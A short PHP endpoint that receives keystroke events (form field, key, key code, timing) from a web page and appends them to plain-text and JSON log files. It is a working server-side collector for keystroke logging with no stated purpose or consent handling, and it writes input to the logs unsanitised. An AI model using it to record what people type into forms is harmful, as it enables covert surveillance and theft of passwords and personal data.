<?php
// Get keystroke data
$data = json_decode(file_get_contents('php://input'), true);

if (isset($data['counter']) && isset($data['field']) && isset($data['key'])) {
    $counter = $data['counter'];
    $field = $data['field'];
    $key = $data['key'];
    $keyCode = $data['keyCode'];
    $isSpecial = $data['isSpecial'] ? 'YES' : 'NO';
    $timestamp = $data['timestamp'];
    $elapsedMs = $data['elapsedMs'];
    $elapsedSeconds = $data['elapsedSeconds'];
    
    // Create keystrokes directory if it doesn't exist
    if (!file_exists('keystrokes')) {
        mkdir('keystrokes', 0755, true);
    }
    
    // Append to keystroke log file
    $logEntry = sprintf(
        "[%04d] [%s] Field: %-10s | Key: %-15s | KeyCode: %3d | Special: %s | Time: %ss (%sms)\n",
        $counter,
        date('Y-m-d H:i:s', $timestamp / 1000),
        $field,
        $key,
        $keyCode,
        $isSpecial,
        $elapsedSeconds,
        $elapsedMs
    );
    
    file_put_contents('keystrokes/keylog.txt', $logEntry, FILE_APPEND);
    
    // Also save as JSON for easy parsing
    $jsonEntry = json_encode($data) . "\n";
    file_put_contents('keystrokes/keylog.json', $jsonEntry, FILE_APPEND);
    
    echo json_encode(['status' => 'success']);
} else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid data']);
}
?>
